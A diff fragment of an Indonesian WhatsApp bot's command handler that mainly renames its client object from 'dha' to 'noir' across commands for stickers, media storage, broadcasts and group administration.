1VCIFRQqgYAA2FcsAV3wR3ryKZZowy9Om9dVQGA+1HhOTQNV/iulKyWUjh8pt4L5/AVevZ9xgvEem/R7twNSgH8wfbH2h+tXfUrO3v7Ke1u41kglUqynvXzlr2nahwLxMk1qzcisWglI2dfsn8jQBul7aiccw92QdD5/GoWaLw25ZkIb8/hRvCuvW3Emkpd2pCy/VlizujdxUnJCsilZFDDyNZzxqRpDI4lWkuBGMRx5+O1CS39woPJGmas0mkwv9Ush8utDHRGztMPmn965niyejojlh7KrLeX8ux91fIbVwkMxAUIWYnYDqauEeiIGBkmLeijFH29pBajMUYDEfWO5NC8eUnchvyIpfSisafpJhX6Rd48QfVTsv8Aembm2+k3Ku4HhR7n1NWm4tzLu2VXue9MPZpgKo90dzXUsaiqRyym5O2V6O1aWTxGGFA90Y3+NP20TQsChYEHIxU0LXB6ZxSS1DZ23p8SbHtPvRMBHLtKP/Kq37Q+LrTR9IuLW1uFfUplKIsbAmPOxY+VSetWAm0u8iDMjFCoZTgjI/vXzhNG0czxuMOrEH4inRJzXhr3vvSoA8pV7SoAvTqztyqCWPQCvTpV8+CltI3far7oNno0djFM0ZeZ0HMS+cHvRxXTCGPhfzOgbmrOXK+i0o+yp8BwT6brUkt3E0UbQsmW88g4/CtQ0lku7j3CHRDlv2qvQrpaLloH5sb4frVt0m3htLRDCnIrkOQTk/7xTg5extQrol17+QobqzKfjRMTK6+7TEq8r5FaEDFo/LPKnbqKIdsd6AVgmpY7MMUcBzHagDhnJHKO9QPF3D1rr2jS2V0oDn3o5Mbo3Y1YSBEpbqaFLmQnIoA+ctHvtQ4D4odLlGwp5ZowdpE8x+YrfNH1G21WxiurR1kgkGVYfl8agfaDwdFxHpxeBVXUYVzE/Tm/0n0rKuBuJrrhPWHstQEi2hflljbrG32h+tAG/mNSOuK8EIx9fFeRTJcW8UsLho5FDKynYg08iEgZoAbEKjq33V7hFGVXf1p4rXnLvQAG6FyC24zS8Eg9Mii+XpXQAIoABSHLHNdpAFfPY0SwCj1NJB71AEffwj6PP61818W2zWvEV/EwxiUn796+n5V8WKUAdGxXz/7XLf6PxfI3LgSxKw/L9KGIpPevDXrUqQHg6Uq9FKgDZuCnD295GVJKsrfeMfpVmjhQoCyY+VVHgJyb+7jzs0YbHwP96uzfVIBxt2pAc2VrFPeRwchIJ94hdgKudygCbDFV/hu1YNLLlmVMAFjkk1ZZRzR7U0MFt5SgGx22xRLkOmRuD0oHZWIpmV5Vy0ZGPs0wObja9hY/axUmJEQEsagZLsyTxJKMMGG/zo6UlsUAO3FxzkBRtXEZwd+9eQR8wJJ716y4NAD+NtqzT2o8FfxWNtS02L/HRjLoo/5ij9a0cMRTiYwWPQUAYd7M+NW02SPSNUbFqXxFI3+Uc/VPp+VbiuCvNnasW9pvB0izXGr6bH7hJeaJR0H2h+tH+yzjczxx6Nqkn85Ri3lY/WH2T6+VAGu4zuK8xvTUEwYU6DQB4wrzFODpXhGBQANKcuB2p1MYGaFmP8wfGlfzGK0Yr9YjA+NAHelsZo3PZmJH31jft5jjj1TTGVTzlJAW7HBXb8a1vS5JI7P8FxWV+3xOX+Bscc5E3Ty9ygDJT19KVIbivM0hHoPWlXi9aVAGqcFSCPXcEgB4mG5+B/StBY4FZtwo/h8RWvk3Mv4GtR0+IXF5Ap3Utk/AUgZNWDG0tkidcZ3PxNSdu4eLbeupIw+zAEUwITbtzR7oeoqgGLpCrZFNsvOnMtHyoJY8jrUcC0LkMPdNAyNnTFzFnGecVJdRQOoApcRsN1yKPU+7mgDyIlTt0p1m8+nnUHxO00FhHcQOyPFKp2OAfQ+nSovVLKS006DVY7mY3bcrMzHY5HYeVYTzOLarR6Hj+Cs0Yyc65Ol/stkeGmCcy82Nlzv91d6hcw2Vvz3EgRPM96r6aelrqmkSvJI15OS8rE9dv70LqV3HNxUy3kck0MC4SJF5t8DtSedpdo0x+BGc6TtU2/8AnXRN2t9Z34P0aRZMbMpG+PhWQe0/gl9Duf4tpCkWDNzMqdYW9PT8q0iNXfX4Lmz0+4t4CvLLzR8o+OPuq0zQR3dpJbzoskTgqynoRV4puadnP5fjxwySjpr+DK+AuPo7q1W21NmF5GMZAz4g8/j51oEOu2L2puPHUIDgg9c/CsB4k0G84e1B7yy51t4piqyL1jYHoavvsv1q21SWb6SIxfKoIQ9+uSo+6pc5tpw0y44cMIyjmtSX9mm6bqdpqCt9FlDFeo6EVzqmqWtgoFxKFYjIUbk/Kq9ofKOKNQZMLGFOQBtnI/vTWisdTvb24mhZvFPKJT0jXuB64xULPJpL27/o6Jf4/HGcpd8Uk/336J4TLMIpEzyuAwyMbGozUbxrrVhZRHCpgNjrnvR9pKlwIZI1KxsPdB8qjtAsWTU9RupM80kxwD2866U7SPLnHjJosUESqqIowqjFYz7f7gPrem2oP/JgLkerN/8AmtthXFfOHtYv/p/Gt+ynKwkQj5Df8c02ZlNXrXrdcivOlI0gD9A0yTWdXttPgkjjlnblVpM8oPrilXOh3p03WbK9XrBMkmPMAgkUqEBdtCbk12xOcZlA+/atWiBiYNGSrDoRWRWT+Fqdo/2ZkP8A5CtdoQE/purq4Ed0Qj9A3Y/tUo8yDuDmqS5G3qadinliAEcjAeXaiwLX4gBJXpTc7wyLlm5TUHHqLDaRM+qnFdnUbf8Arcqe/MtDaWxpXo81B+Zfd7HrUnaxGRFcH3GANQ9xfWbIQLhMntT2i6qnI8KEP4e4x5Uclex8XWhzi6IroUoUFizKAAPWhtft2Oi6facp5pJIoyPlVlhmEqBlPUV0aiWPk2/ydWHyvjjFV9rbKvqzMOLtOUA8ip5bb5/tXGp2F9a63/EtNiE3OOV4871ZnJOwr1RUvCnff7NI+c4cajpU/wBlesf4td6iJ7sG1tVGPBDZ5qJt5buLX3imcG1kjLRjbty5/Opd12ocW8YuWn5SZSoXJPQeQqljr2Zy8lTbuKSqlRFNw+k7apHeLFLZ3hDBOpB33/GsN4p4c1HgnWYrq1kbwefmgmXt/pNfSKHbeo/XNIttWsJbS8jEkTjG46VUYqKpGGTLLI+Utme+zzXYNUFxcmVRfNgyw4xjfqN9x0q2aPpctnJdGCdTBKMxoRnlb1rEuItG1HgfiBJrdm8LmzDL2YfZNbLwBxDa8Q6UZYWVbhMCWLO6H9vWpWKKr9Gr8zLK7e6X8aJeSEW6xBMkJgZPenLRQzSMuxLk0RNHlTneoqG/tbK5Zb2dIFdvdMhwCfLNaaOdtydsmZ3MNpJIQchSa+TNWna6v7m4fPNLKznPqa+r768tXsXKXMLIR1EgI/OsM4j4WfUFmlso0NyZCw7cwz0qJZFFpMcYOSbRm2KXbepa64d1e1J8XT7jHmqcw/Chv4Vf+G7m0nVEGWZkKgD50+SJpgApUqVOxFzmYqeYHcHIrZkYOgdcYYZFKlQA3LzcuVUscjYGvA0pA/ksf/kKVKkB7mTO8LD5im54iyEjO/nSpVll9G2Eh543V6kOHreTxJLvfY+Go8/M0qVYYUuZ0Zn9FlotLgxN/pqXSUSICvQ0qVdxxI9ArvG1KlQAj0rjHpSpUAedOldg5G/lSpUARfEWgWev6fJZ30fMjDZh1U+Yr5/vbfVPZzxaGhfxFQ+63RZk8jSpUAbnw9xDZ6/pMd5Zt7rbMh6o3cGs+9sbkTaPEGwrmViPPHL+9KlUy0VHpld4LszJqcrkAhQF++tOtrUIF2GcUqVcaVybOtukkEEKOwqpe0GZYuH7sjbKFR86VKq9kPRh+PKlSpV1nIf/2Q==",
@@ -4187,7 +3942,7 @@ Source : ${anu.result.source}
                                    contextInfo: {}
                             })
 
-                            dha.relayWAMessage(res)
+                            noir.relayWAMessage(res)
                             break
                             //------------------<HEWAN MENU>---------------
 
@@ -4199,7 +3954,7 @@ Source : ${anu.result.source}
                             reply(`Jangan Lupa Subscribe YT Owner:\n https://youtu.be/Wgi3uOGlmYs`)
                             break
                      case 'masukandata':
-                            reply(`*「BOT MELAYANI」*\n\n━━━━━━━━━━━━━━━━━━━━\n\nMASUKKANA DATA BERIKUT\n*•NAMA GAME:*\n*•ID GAME:*\n*•USER NAME:*\n━━━━━━━━━━━━━━━━━━━━\n*NOTE:*\n*1.* _JANGAN LUPA BUKTI TRXNYA_\n*2.* _OTOMATIS PESANAN_\n_LANSUNG DI PROSES_\n*3.* _PESANAN ANDA DI PROSES_\n_OLEH_\n\n   *©hzkyx*\n\n_JIKA PESANAN ANDA LOW_\n_PROSES MOHON BERSABAR_\nwa.me/6282287486762`)
+                            reply(`*「BOT MELAYANI」*\n\n━━━━━━━━━━━━━━━━━━━━\n\nMASUKKANA DATA BERIKUT\n*•NAMA GAME:*\n*•ID GAME:*\n*•USER NAME:*\n━━━━━━━━━━━━━━━━━━━━\n*NOTE:*\n*1.* _JANGAN LUPA BUKTI TRXNYA_\n*2.* _OTOMATIS PESANAN_\n_LANSUNG DI PROSES_\n*3.* _PESANAN ANDA DI PROSES_\n_OLEH_\n\n   *©noir*\n\n_JIKA PESANAN ANDA LOW_\n_PROSES MOHON BERSABAR_\nwa.me/6282287486762`)
                             break
                      case 'ping':
                      case 'speed':
@@ -4208,13 +3963,13 @@ Source : ${anu.result.source}
                             reply(`「 *𝙎𝙋𝙀𝙀𝘿 𝙏𝙀𝙎𝙏* 」\nMerespon dalam ${latensie.toFixed(4)} Sec 💬`)
                             break
                      case 'botstat':
-                            groups = dha.chats.array.filter(v => v.jid.endsWith('g.us'))
-                            privat = dha.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
+                            groups = noir.chats.array.filter(v => v.jid.endsWith('g.us'))
+                            privat = noir.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
                             ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
                             charger = `${charging ? 'lagi dicas' : 'ga dicas'}`
                             uptime = process.uptime();
                             timestampe = speed();
-                            totalChat = await dha.chats.all()
+                            totalChat = await noir.chats.all()
                             latensie = speed() - timestampe
                             total = math(`${groups.length}*${privat.length}`)
                             teks = `\`\`\`BOT STATISTICS\`\`\`
@@ -4230,11 +3985,11 @@ Source : ${anu.result.source}
 \`\`\`▢ Platform : ${os.platform()}\`\`\`
 \`\`\`▢ Hostname : ${os.hostname()}\`\`\`
 \`\`\`▢ Uptime : ${runtime(process.uptime())}\`\`\`
-\`\`\`▢ Wa Version: ${dha.user.phone.wa_version}\`\`\`
-\`\`\`▢ Os Version: ${dha.user.phone.os_version}\`\`\`
-\`\`\`▢ Device Manufacturer: ${dha.user.phone.device_manufacturer}\`\`\`
-\`\`\`▢ Device Model: ${dha.user.phone.device_model}\`\`\`
-\`\`\`▢ Os Build Number: ${dha.user.phone.os_build_number}\`\`\``
+\`\`\`▢ Wa Version: ${noir.user.phone.wa_version}\`\`\`
+\`\`\`▢ Os Version: ${noir.user.phone.os_version}\`\`\`
+\`\`\`▢ Device Manufacturer: ${noir.user.phone.device_manufacturer}\`\`\`
+\`\`\`▢ Device Model: ${noir.user.phone.device_model}\`\`\`
+\`\`\`▢ Os Build Number: ${noir.user.phone.os_build_number}\`\`\``
                             reply(teks)
                             break
                             //------------------< Owner >-------------------
@@ -4273,13 +4028,13 @@ Source : ${anu.result.source}
                      case 'tupai':
                             reply('PROSES')
                             encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
-                            media = await dha.downloadAndSaveMediaMessage(encmedia)
+                            media = await noir.downloadAndSaveMediaMessage(encmedia)
                             ran = getRandom('.mp3')
                             exec(`ffmpeg -i ${media} -filter:a "atempo=0.5,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
                                    fs.unlinkSync(media)
                                    if (err) return reply('Error!')
                                    hah = fs.readFileSync(ran)
-                                   dha.sendMessage(from, hah, audio, {
+                                   noir.sendMessage(from, hah, audio, {
                                           mimetype: 'audio/mp4',
                                           ptt: true,
                                           quoted: troli
@@ -4293,11 +4048,11 @@ Source : ${anu.result.source}
                             svst = body.slice(9)
                             if (!svst) return reply('Nama sticker nya apa?')
                             boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
-                            delb = await dha.downloadMediaMessage(boij)
+                            delb = await noir.downloadMediaMessage(boij)
                             setiker.push(`${svst}`)
                             fs.writeFileSync(`./temp/stick/${svst}.webp`, delb)
                             fs.writeFileSync('./temp/stick.json', JSON.stringify(setiker))
-                            dha.sendMessage(from, `Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststik`, MessageType.text, {
+                            noir.sendMessage(from, `Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststik`, MessageType.text, {
                                    quoted: troli
                             })
                             break
@@ -4307,11 +4062,11 @@ Source : ${anu.result.source}
                             svst = body.slice(8)
                             if (!svst) return reply('Nama imagenya apa')
                             boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
-                            delb = await dha.downloadMediaMessage(boij)
+                            delb = await noir.downloadMediaMessage(boij)
                             imagenye.push(`${svst}`)
                             fs.writeFileSync(`./temp/foto/${svst}jpeg`, delb)
                             fs.writeFileSync('./temp/image.json', JSON.stringify(imagenye))
-                            dha.sendMessage(from, `Sukses Menambahkan image\nCek dengan cara ${prefix}listimg`, MessageType.text, {
+                            noir.sendMessage(from, `Sukses Menambahkan image\nCek dengan cara ${prefix}listimg`, MessageType.text, {
                                    quoted: troli
                             })
                             break
@@ -4322,11 +4077,11 @@ Source : ${anu.result.source}
                             svst = body.slice(8)
                             if (!svst) return reply('Nama vidionya apa')
                             boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
-                            delb = await dha.downloadMediaMessage(boij)
+                            delb = await noir.downloadMediaMessage(boij)
                             imagenye.push(`${svst}`)
                             fs.writeFileSync(`./temp/video/${svst}.mp4`, delb)
                             fs.writeFileSync('./temp/video.json', JSON.stringify(imagenye))
-                            dha.sendMessage(from, `Sukses Menambahkan video\nCek dengan cara ${prefix}listvideo`, MessageType.text, {
+                            noir.sendMessage(from, `Sukses Menambahkan video\nCek dengan cara ${prefix}listvideo`, MessageType.text, {
                                    quoted: troli
                             })
                             break
@@ -4337,11 +4092,11 @@ Source : ${anu.result.source}
                             svst = body.slice(7)
                             if (!svst) return reply('Nama audionya apa')
                             boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
-                            delb = await dha.downloadMediaMessage(boij)
+                            delb = await noir.downloadMediaMessage(boij)
                             audionye.push(`${svst}`)
                             fs.writeFileSync(`./temp/audio/${svst}.mp3`, delb)
                             fs.writeFileSync('./temp/vn.json', JSON.stringify(audionye))
-                            dha.sendMessage(from, `Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`, MessageType.text, {
+                            noir.sendMessage(from, `Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`, MessageType.text, {
                                    quoted: troli
                             })
                             break
@@ -4351,7 +4106,7 @@ Source : ${anu.result.source}
                                    teks += `- ${awokwkwk}\n`
                             }
                             teks += `\n*Total : ${setiker.length}*`
-                            dha.sendMessage(from, teks.trim(), extendedText, {
+                            noir.sendMessage(from, teks.trim(), extendedText, {
                                    quoted: troli,
                                    contextInfo: {
                                           "mentionedJid": setiker
@@ -4364,7 +4119,7 @@ Source : ${anu.result.source}
                                    teks += `- ${awokwkwk}\n`
                             }
                             teks += `\n*Total : ${imagenye.length}*`
-                            dha.sendMessage(from, teks.trim(), extendedText, {
+                            noir.sendMessage(from, teks.trim(), extendedText, {
                                    quoted: troli,
                                    contextInfo: {
                                           "mentionedJid": setiker
@@ -4377,7 +4132,7 @@ Source : ${anu.result.source}
                                    teks += `- ${awokwkwk}\n`
                             }
                             teks += `\n*Total : ${videonye.length}* `
-                            dha.sendMessage(from, teks.trim(), extendedText, {
+                            noir.sendMessage(from, teks.trim(), extendedText, {
                                    quoted: troli,
                                    contextInfo: {
                                           "mentionedJid": imagenye
@@ -4390,7 +4145,7 @@ Source : ${anu.result.source}
                                    teks += `- ${awokwkwk}\n`
                             }
                             teks += `\n*Total : ${audionye.length}*`
-                            dha.sendMessage(from, teks.trim(), extendedText, {
+                            noir.sendMessage(from, teks.trim(), extendedText, {
                                    quoted: troli,
                                    contextInfo: {
                                           "mentionedJid": audionye
@@ -4401,7 +4156,7 @@ Source : ${anu.result.source}
                             namastc = body.slice(9)
                             try {
                                    result = fs.readFileSync(`./temp/stick/${namastc}.webp`)
-                                   dha.sendMessage(from, result, sticker, {
+                                   noir.sendMessage(from, result, sticker, {
                                           quoted: troli
                                    })
                             } catch {
@@ -4412,7 +4167,7 @@ Source : ${anu.result.source}
                             namastc = body.slice(8)
                             try {
                                    buffer = fs.readFileSync(`./temp/foto/${namastc}.jpeg`)
-                                   dha.sendMessage(from, buffer, image, {
+                                   noir.sendMessage(from, buffer, image, {
                                           quoted: troli,
                                           caption: `Result From Database : ${namastc}.jpeg`
                                    })
@@ -4425,7 +4180,7 @@ Source : ${anu.result.source}
                             namastc = body.slice(8)
                             try {
                                    buffer = fs.readFileSync(`./temp/video/${namastc}.mp4`)
-                                   dha.sendMessage(from, buffer, video, {
+                                   noir.sendMessage(from, buffer, video, {
                                           quoted: troli,
                                           caption: `Result From Database : ${namastc}.mp4`
                                    })
@@ -4437,7 +4192,7 @@ Source : ${anu.result.source}
                             namastc = body.slice(7)
                             try {
                                    buffer = fs.readFileSync(`./temp/audio/${namastc}.mp3`)
-                                   dha.sendMessage(from, buffer, audio, {
+                                   noir.sendMessage(from, buffer, audio, {
                                           mimetype: 'audio/mp4',
                                           quoted: troli,
                                           ptt: true
@@ -4451,7 +4206,7 @@ Source : ${anu.result.source}
                             if (!isOwner) return reply(mess.only.owner)
                             if (!isUrl(args[0]) && !args[0].includes('https://chat.whatsapp.com/')) return reply('Linknya Invalid Tod')
                             link = args[0].replace('https://chat.whatsapp.com/', '')
-                            fak = dha.query({
+                            fak = noir.query({
                                    json: ['action', 'invite', link],
                                    expect200: true
                             })
@@ -4473,12 +4228,12 @@ Source : ${anu.result.source}
                      case 'broadcast':
                             if (!isOwner) return reply(mess.only.owner)
                             if (args.length < 1) return reply('teks?')
-                            anu = await dha.chats.all()
+                            anu = await noir.chats.all()
                             if (isMedia && !mek.message.videoMessage || isQuotedImage) {
                                    const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
-                                   bc = await dha.downloadMediaMessage(encmedia)
+                                   bc = await noir.downloadMediaMessage(encmedia)
                                    for (let _ of anu) {
-                                          dha.sendMessage(_.jid, bc, image, {
+                                          noir.sendMessage(_.jid, bc, image, {
                                                  quoted: freply,
                                                  caption: `*「 PESAN SIARAN BOT 」*\n\n${body.slice(4)}`
                                           })
@@ -4493,10 +4248,10 @@ Source : ${anu.result.source}
                             break
                      case 'clearall':
                             if (!isOwner) return reply(mess.only.owner)
-                            anu = await dha.chats.all()
-                            dha.setMaxListeners(25)
+                            anu = await noir.chats.all()
+                            noir.setMaxListeners(25)
                             for (let _ of anu) {
-                                   dha.deleteChat(_.jid)
+                                   noir.deleteChat(_.jid)
                             }
                             reply('Sukses delete all chat :)')
                             break
@@ -4530,19 +4285,19 @@ Source : ${anu.result.source}
                             break
                      case 'leaveall':
                             if (!isOwner) return reply(mess.only.owner)
-                            let totalgroup = dha.chats.array.filter(u => u.jid.endsWith('@g.us')).map(u => u.jid)
+                            let totalgroup = noir.chats.array.filter(u => u.jid.endsWith('@g.us')).map(u => u.jid)
                             for (let id of totalgroup) {
                                    sendMess(id, 'Byee', null)
                                    await sleep(3000)
-                                   dha.groupLeave(id)
+                                   noir.groupLeave(id)
                             }
                             break
                             //------------------< G R U P >-------------------
                      case 'linkgc':
                             if (!isGroup) return reply(mess.only.group)
-                            linkgc = await dha.groupInviteCode(from)
+                            linkgc = await noir.groupInviteCode(from)
                             yeh = `https://chat.whatsapp.com/${linkgc}\n\nlink Group *${groupName}*`
-                            dha.sendMessage(from, yeh, text, {
+                            noir.sendMessage(from, yeh, text, {
                                    quoted: mek
                             })
                             break
@@ -4556,10 +4311,10 @@ Source : ${anu.result.source}
                                    entah = arg.split("|")[0]
                                    entah = entah.replace(new RegExp("[()+-/ +/]", "gi"), "")
                                    entah = `${entah}@s.whatsapp.net`
-                                   dha.groupAdd(from, [entah])
+                                   noir.groupAdd(from, [entah])
                             } else {
                                    entah = mek.message.extendedTextMessage.contextInfo.participant
-                                   dha.groupAdd(from, [entah])
+                                   noir.groupAdd(from, [entah])
                             }
                             break
                      case 'promote':
@@ -4572,13 +4327,13 @@ Source : ${anu.result.source}
                                           for (let ids of entah) {
                                                  mems_ids.push(ids)
                                           }
-                                          dha.groupMakeAdmin(from, mems_ids)
+                                          noir.groupMakeAdmin(from, mems_ids)
                                    } else {
-                                          dha.groupMakeAdmin(from, entah)
+                                          noir.groupMakeAdmin(from, entah)
                                    }
                             } else {
                                    entah = mek.message.extendedTextMessage.contextInfo.participant
-                                   dha.groupMakeAdmin(from, [entah])
+                                   noir.groupMakeAdmin(from, [entah])
                             }
                             break
                      case 'demote':
@@ -4591,20 +4346,20 @@ Source : ${anu.result.source}
                                           for (let ids of entah) {
                                                  mems_ids.push(ids)
                                           }
-                                          dha.groupDemoteAdmin(from, mems_ids)
+                                          noir.groupDemoteAdmin(from, mems_ids)
                                    } else {
-                                          dha.groupDemoteAdmin(from, [entah[0]])
+                                          noir.groupDemoteAdmin(from, [entah[0]])
                                    }
                             } else {
                                    entah = mek.message.extendedTextMessage.contextInfo.participant
-                                   dha.groupDemoteAdmin(from, [entah])
+                                   noir.groupDemoteAdmin(from, [entah])
                             }
                             break
                      case 'setgrupname':
                             if (!isGroup) return reply(mess.only.group)
                             if (!isBotGroupAdmins) return
                             if (args.length == 0) return reply(`Penggunaan ${prefix}setgrupname name`)
-                            dha.groupUpdateSubject(from, q)
+                            noir.groupUpdateSubject(from, q)
                                    .then((res) => reply(jsonformat(res)))
                                    .catch((err) => reply(jsonformat(err)))
                             break
@@ -4612,7 +4367,7 @@ Source : ${anu.result.source}
                             if (!isGroup) return reply(mess.only.group)
                             if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                             if (args.length == 0) return reply(`Penggunaan ${prefix}setdesc desc`)
-                            dha.groupUpdateDescription(from, q)
+                            noir.groupUpdateDescription(from, q)
                                    .then((res) => reply(jsonformat(res)))
                                    .catch((err) => reply(jsonformat(err)))
                             break
@@ -4621,8 +4376,8 @@ Source : ${anu.result.source}
                             if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                             if (isQuotedImage) {
                                    let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
-                                   let media = await dha.downloadMediaMessage(encmedia)
-                                   dha.updateProfilePicture(from, media)
+                                   let media = await noir.downloadMediaMessage(encmedia)
+                                   noir.updateProfilePicture(from, media)
                                           .then((res) => reply(jsonformat(res)))
                                           .catch((err) => reply(jsonformat(err)))
                             } else {
@@ -4634,18 +4389,18 @@ Source : ${anu.result.source}
                             let Levelnye = level.getLevelingLevel(sender, _level)
                             let Xpluu = level.getLevelingXp(sender, _level)
                             let requiredXplu = 10 * Math.pow(Levelnye, 2) + 50 * Levelnye + 100
-                            dha.updatePresence(from, Presence.composing)
+                            noir.updatePresence(from, Presence.composing)
                             try {
-                                   profil = await dha.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
+                                   profil = await noir.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
                             } catch {
                                    profil = errorImg
                             }
-                            thu = await dha.getStatus(`${sender.split('@')[0]}@s.whatsapp.net`, MessageType.text)
-                            me = dha.user
+                            thu = await noir.getStatus(`${sender.split('@')[0]}@s.whatsapp.net`, MessageType.text)
+                            me = noir.user
                             uptime = process.uptime()
                             profile = `-----[ *USER INFO* ]-----\n\n➸ *Username:* ${pushname}\n➸ *Status:* ${thu.status}\n➸ *Premium*: ${isPremium ? 'Ya' : 'No'}\n➸ *Admin*: ${isGroupAdmins ? 'Ya' : 'No'}\n➸ *Prefix :* Multi Prefix\n\n=_=_=_=_=_=_=_=_=_=_=_=_=\n\nYour progress:\n➸ *Level*: ${Levelnye}\n➸ *XP*: ${Xpluu} / ${requiredXplu}`
                             buff = await getBuffer(profil)
-                            dha.sendMessage(from, buff, image, {
+                            noir.sendMessage(from, buff, image, {
                                    quoted: freply,
                                    caption: profile
                             })
@@ -4663,12 +4418,12 @@ Source : ${anu.result.source}
                      case 'groupinfo':
                             if (!isGroup) return reply(mess.only.group)
                             try {
-                                   var pic = await dha.getProfilePicture(from)
+                                   var pic = await noir.getProfilePicture(from)
                             } catch {
                                    var pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
                             }
                             let ingfo = `*G R O U P I N F O*\n\n*Name :* ${groupName}\n*ID Grup :* ${from}\n*Dibuat :* ${moment(`${groupMetadata.creation}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n*Owner Grup :* @${groupMetadata.owner.split('@')[0]}\n*Jumlah Admin :* ${groupAdmins.length}\n*Jumlah Peserta :* ${groupMembers.length}\n*Welcome :* ${isWelkom ? 'Aktif' : 'Mati'}\n*AntiLink :* ${isAntiLink ? 'Aktif' : 'Mati'}\n*Desc :* \n${groupMetadata.desc}`
-                            dha.sendMessage(from, await getBuffer(pic), image, {
+                            noir.sendMessage(from, await getBuffer(pic), image, {
                                    quoted: mek,
                                    caption: ingfo,
                                    contextInfo: {
@@ -4694,7 +4449,7 @@ Source : ${anu.result.source}
                      case 'leave':
                             if (!isGroup) return reply(mess.only.group)
                             setTimeout(() => {
-                                   dha.groupLeave(from)
+                                   noir.groupLeave(from)
                             }, 2000)
                             setTimeout(() => {
                                    reply('Byee...')
@@ -4706,8 +4461,8 @@ Source : ${anu.result.source}
                             if (!isGroup) return reply(`Only group`)
                             try {
                                    let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
-                                   let online = [...Object.keys(dha.chats.get(ido).presences), dha.user.jid]
-                                   dha.sendMessage(from, 'List Online:\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join `\n`, text, {
+                                   let online = [...Object.keys(noir.chats.get(ido).presences), noir.user.jid]
+                                   noir.sendMessage(from, 'List Online:\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join `\n`, text, {
                                           quoted: mek,
                                           contextInfo: {
                                                  mentionedJid: online
@@ -4728,7 +4483,7 @@ Source : ${anu.result.source}
                      case 'sider':
                             if (!isGroup) return reply(mess.only.group)
                             try {
-                                   infom = await dha.messageInfo(from, mek.message.extendedTextMessage.contextInfo.stanzaId)
+                                   infom = await noir.messageInfo(from, mek.message.extendedTextMessage.contextInfo.stanzaId)
                                    tagg = []
                                    teks = `*• Dibaca oleh:*\n\n`
                                    for (let i of infom.reads) {
@@ -4796,7 +4551,7 @@ Source : ${anu.result.source}
                             const cita = ['http://piyobot.000webhostapp.com/citacita1.mp3', 'http://piyobot.000webhostapp.com/citacita2.mp3', 'http://piyobot.000webhostapp.com/citacita3.mp3', 'http://piyobot.000webhostapp.com/citacita4.mp3', 'http://piyobot.000webhostapp.com/citacita5.mp3', 'http://piyobot.000webhostapp.com/citacita6.mp3', 'http://piyobot.000webhostapp.com/citacita7.mp3', 'http://piyobot.000webhostapp.com/citacita8.mp3', 'http://piyobot.000webhostapp.com/citacita9.mp3', 'http://piyobot.000webhostapp.com/citacita10.mp3', 'http://piyobot.000webhostapp.com/citacita11.mp3', 'http://piyobot.000webhostapp.com/citacita12.mp3', 'http://piyobot.000webhostapp.com/citacita13.mp3', 'http://piyobot.000webhostapp.com/citacita14.mp3', 'http://piyobot.000webhostapp.com/citacita15.mp3', 'http://piyobot.000webhostapp.com/citacita16.mp3', 'http://piyobot.000webhostapp.com/citacita17.mp3', 'http://piyobot.000webhostapp.com/citacita18.mp3', 'http://piyobot.000webhostapp.com/citacita19.mp3', 'http://piyobot.000webhostapp.com/citacita20.mp3', 'http://piyobot.000webhostapp.com/citacita21.mp3', 'http://piyobot.000webhostapp.com/citacita22.mp3', 'http://piyobot.000webhostapp.com/citacita23.mp3', 'http://piyobot.000webhostapp.com/citacita24.mp3', 'http://piyobot.000webhostapp.com/citacita25.mp3', 'http://piyobot.000webhostapp.com/citacita26.mp3', 'http://piyobot.000webhostapp.com/citacita27.mp3', 'http://piyobot.000webhostapp.com/citacita28.mp3', 'http://piyobot.000webhostapp.com/citacita29.mp3', 'http://piyobot.000webhostapp.com/citacita30.mp3', 'http://piyobot.000webhostapp.com/citacita31.mp3', 'http://piyobot.000webhostapp.com/citacita32.mp3', 'http://piyobot.000webhostapp.com/citacita33.mp3', 'http://piyobot.000webhostapp.com/citacita34.mp3', 'http://piyobot.000webhostapp.com/citacita35.mp3']
                             const cita3 = cita[Math.floor(Math.random() * cita.length)]
                             cita2 = await getBuffer(cita3)
-                            dha.sendMessage(from, cita2, audio, {
+                            noir.sendMessage(from, cita2, audio, {
                                    mimetype: 'audio/mp4',
                                    ptt: true,
                                    quoted: mek
@@ -4806,7 +4561,7 @@ Source : ${anu.result.source}
                             apakah = body.slice(1)
                             const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Coba Ulangi']
                             const kah = apa[Math.floor(Math.random() * apa.length)]
-                            dha.sendMessage(from, '*Pertanyaan :* ' + apakah + '\n*Jawaban :* ' + kah, text, {
+                            noir.sendMessage(from, '*Pertanyaan :* ' + apakah + '\n*Jawaban :* ' + kah, text, {
                                    quoted: mek
                             })
                             break
@@ -4815,7 +4570,7 @@ Source : ${anu.result.source}
                             rate = body.slice(1)
